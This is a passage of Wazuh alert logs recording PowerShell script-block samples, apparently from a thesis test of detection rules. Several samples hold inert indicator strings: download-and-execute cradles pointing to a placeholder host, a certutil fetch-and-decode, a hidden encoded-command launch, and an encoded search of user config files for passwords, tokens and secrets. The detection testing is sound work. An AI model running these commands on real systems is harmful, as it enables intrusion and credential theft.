\\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-135'; $uri = 'https://intranet.example.local/status/api/v1/health?format=json'; Write-Output $uri; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"370f0418-1718-481c-af00-0fd81570b99e\"}}}","id":"1784280991.490889","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:31.290+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"d080c5de-cf2b-4303-8c76-ec16ecac9cb7","scriptBlockText":"$sampleId='PST-136'; $encoded='RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722608","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-136'; $encoded='RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: d080c5de-cf2b-4303-8c76-ec16ecac9cb7\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:30.7659894Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:30.7659894Z\",\"eventRecordID\":\"722608\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-136'; $encoded='RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: d080c5de-cf2b-4303-8c76-ec16ecac9cb7\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-136'; $encoded='RwBlAHQALQBDAGgAaQBsAGQASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAQwA6AFwAVQBzAGUAcgBzACcAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEkAbgBjAGwAdQBkAGUAIAAnACoALgBjAG8AbgBmAGkAZwAnACwAJwAqAC4AeABtAGwAJwAgAHwAIABTAGUAbABlAGMAdAAtAFMAdAByAGkAbgBnACAALQBQAGEAdAB0AGUAcgBuACAAJwBwAGEAcwBzAHcAbwByAGQAfAB0AG8AawBlAG4AfABzAGUAYwByAGUAdAAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"d080c5de-cf2b-4303-8c76-ec16ecac9cb7\"}}}","id":"1784280991.493414","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":13,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:36:31.294+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"79e799f7-72df-4fdd-beb3-a7f75c85ccdc","scriptBlockText":"$sampleId='PST-137'; $indicator='iEX (nEW-objeCT net.weBcLienT).DOwNLoaDstriNg(''HttPS://sTagE.exAMpLE.iNVAlID/BOOtstRAP.PS1'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722612","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-137'; $indicator='iEX (nEW-objeCT net.weBcLienT).DOwNLoaDstriNg(''HttPS://sTagE.exAMpLE.iNVAlID/BOOtstRAP.PS1'')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 79e799f7-72df-4fdd-beb3-a7f75c85ccdc\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:31.0933034Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:31.0933034Z\",\"eventRecordID\":\"722612\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-137'; $indicator='iEX (nEW-objeCT net.weBcLienT).DOwNLoaDstriNg(''HttPS://sTagE.exAMpLE.iNVAlID/BOOtstRAP.PS1'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 79e799f7-72df-4fdd-beb3-a7f75c85ccdc\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-137'; $indicator='iEX (nEW-objeCT net.weBcLienT).DOwNLoaDstriNg(''HttPS://sTagE.exAMpLE.iNVAlID/BOOtstRAP.PS1'')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"79e799f7-72df-4fdd-beb3-a7f75c85ccdc\"}}}","id":"1784280991.497085","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":4,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:36:31.303+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"efbe1115-fead-4229-85d2-a3a10231b44c","scriptBlockText":"$sampleId='PST-138'; $indicator='certutil.exe -urlcache -split -f https://cert.example.invalid/blob.txt C:\\\\__THESIS_INERT__\\\\blob.txt; certutil.exe -decode C:\\\\__THESIS_INERT__\\\\blob.txt C:\\\\__THESIS_INERT__\\\\stage.bin'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722616","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-138'; $indicator='certutil.exe -urlcache -split -f https://cert.example.invalid/blob.txt C:\\__THESIS_INERT__\\blob.txt; certutil.exe -decode C:\\__THESIS_INERT__\\blob.txt C:\\__THESIS_INERT__\\stage.bin'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: efbe1115-fead-4229-85d2-a3a10231b44c\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:31.4200713Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:31.4200713Z\",\"eventRecordID\":\"722616\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-138'; $indicator='certutil.exe -urlcache -split -f https://cert.example.invalid/blob.txt C:\\\\__THESIS_INERT__\\\\blob.txt; certutil.exe -decode C:\\\\__THESIS_INERT__\\\\blob.txt C:\\\\__THESIS_INERT__\\\\stage.bin'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: efbe1115-fead-4229-85d2-a3a10231b44c\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-138'; $indicator='certutil.exe -urlcache -split -f https://cert.example.invalid/blob.txt C:\\\\\\\\__THESIS_INERT__\\\\\\\\blob.txt; certutil.exe -decode C:\\\\\\\\__THESIS_INERT__\\\\\\\\blob.txt C:\\\\\\\\__THESIS_INERT__\\\\\\\\stage.bin'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"efbe1115-fead-4229-85d2-a3a10231b44c\"}}}","id":"1784280992.497085","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:32.423+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"0a5dd4aa-3e7c-4da0-a4d1-4fde3649a991","scriptBlockText":"$sampleId='PST-139'; $indicator='IEX (New-' + 'Object' + ' Net.We' + 'bClient)' + '.DownloadStri' + 'ng(''https' + '://stage.exam' + 'ple.in' + 'valid/boot' + 'strap.ps1'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722629","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-139'; $indicator='IEX (New-' + 'Object' + ' Net.We' + 'bClient)' + '.DownloadStri' + 'ng(''https' + '://stage.exam' + 'ple.in' + 'valid/boot' + 'strap.ps1'')'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 0a5dd4aa-3e7c-4da0-a4d1-4fde3649a991\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:31.7417582Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:31.7417582Z\",\"eventRecordID\":\"722629\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-139'; $indicator='IEX (New-' + 'Object' + ' Net.We' + 'bClient)' + '.DownloadStri' + 'ng(''https' + '://stage.exam' + 'ple.in' + 'valid/boot' + 'strap.ps1'')'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 0a5dd4aa-3e7c-4da0-a4d1-4fde3649a991\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-139'; $indicator='IEX (New-' + 'Object' + ' Net.We' + 'bClient)' + '.DownloadStri' + 'ng(''https' + '://stage.exam' + 'ple.in' + 'valid/boot' + 'strap.ps1'')'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"0a5dd4aa-3e7c-4da0-a4d1-4fde3649a991\"}}}","id":"1784280992.497085","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","firedtimes":5,"groups":["windows"," powershell"],"id":"91837","level":4,"mail":false,"mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]}},"timestamp":"2026-07-17T11:36:32.511+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"bf1ba6c7-5024-4e1e-944e-c5774e43ce2a","scriptBlockText":"$sampleId='PST-140'; Get-Date | Select-Object DateTime; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722631","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-140'; Get-Date | Select-Object DateTime; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: bf1ba6c7-5024-4e1e-944e-c5774e43ce2a\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:32.0703753Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:32.0703753Z\",\"eventRecordID\":\"722631\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-140'; Get-Date | Select-Object DateTime; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: bf1ba6c7-5024-4e1e-944e-c5774e43ce2a\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-140'; Get-Date | Select-Object DateTime; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"bf1ba6c7-5024-4e1e-944e-c5774e43ce2a\"}}}","id":"1784280992.499590","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:32.542+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"a8152bb5-0540-4899-a578-5b6b6a204f73","scriptBlockText":"$sampleId='PST-141'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722636","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-141'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: a8152bb5-0540-4899-a578-5b6b6a204f73\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:32.4330295Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:32.4330295Z\",\"eventRecordID\":\"722636\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-141'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: a8152bb5-0540-4899-a578-5b6b6a204f73\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-141'; $audit = 'credential policy review: password age setting checked, no password value stored'; Write-Output $audit; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"a8152bb5-0540-4899-a578-5b6b6a204f73\"}}}","id":"1784280993.499590","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:33.443+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f1a79161-4979-4891-a25e-b9938d2b19e5","scriptBlockText":"$sampleId='PST-142'; $indicator='powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722639","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-142'; $indicator='powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f1a79161-4979-4891-a25e-b9938d2b19e5\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:32.7658123Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:32.7658123Z\",\"eventRecordID\":\"722639\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-142'; $indicator='powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f1a79161-4979-4891-a25e-b9938d2b19e5\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-142'; $indicator='powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f1a79161-4979-4891-a25e-b9938d2b19e5\"}}}","id":"1784280993.499590","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:33.449+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"0b5ee2bd-6986-433d-9adc-0cdf907f9ea4","scriptBlockText":"$sampleId='PST-143'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"722642","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-143'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 0b5ee2bd-6986-433d-9adc-0cdf907f9ea4\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:36:33.0863308Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:36:33.0863308Z\",\"eventRecordID\":\"722642\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-143'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 0b5ee2bd-6986-433d-9adc-0cdf907f9ea4\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-143'; Get-NetIPConfiguration | Select-Object -First 3 InterfaceAlias, IPv4Address; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"0b5ee2bd-6986-433d-9adc-0cdf907f9ea4\"}}}","id":"1784280993.499590","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:36:33.455+0200"}
